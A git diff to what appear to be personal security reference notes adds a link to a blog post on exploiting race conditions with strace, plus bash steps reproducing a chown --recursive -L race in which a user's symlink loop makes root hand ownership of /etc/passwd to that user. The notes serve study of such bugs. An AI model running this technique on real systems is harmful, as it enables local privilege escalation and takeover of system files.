@@ -84,6 +84,27 @@ msf > set FOO 123
 - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#-chain-race
     - ~/share/ctf/darkctf2020/chain-race/
 
+- [Exploiting Race Conditions with strace &\#8211; Mike Salvatore&\#039;s Blog](https://salvatoresecurity.com/exploiting-race-conditions-with-strace/)
+    - [chown: race condition with \-\-recursive \-L](https://lists.gnu.org/archive/html/coreutils/2017-12/msg00045.html)
+    ```bash
+    # Terminal 1 (root)
+    sudo mkdir -p /var/www/chown-test && cd /var/www
+    sudo mkdir chown-test/foo
+    sudo mkdir chown-test/bar
+    sudo ln -s ../bar chown-test/foo/quux
+    sudo touch chown-test/bar/baz
+    
+    # Terminal 2 (testuser)
+    cd /var/www/chown-test/bar
+    while true; do ln -s -f /etc/passwd ./baz; done;
+    
+    # Terminal 1 (root)
+    sudo strace -o /dev/null -e inject=fchownat:delay_exit=1000000 chown --recursive --verbose -L testuser chown-test
+    ls -l /etc/passwd
+    # Output:
+    # -rw-r--r-- 1 testuser root 1.5K 2017-12-17 18:34 /etc/passwd
+    ```
+
 ### TOCTOU
 
 ```bash
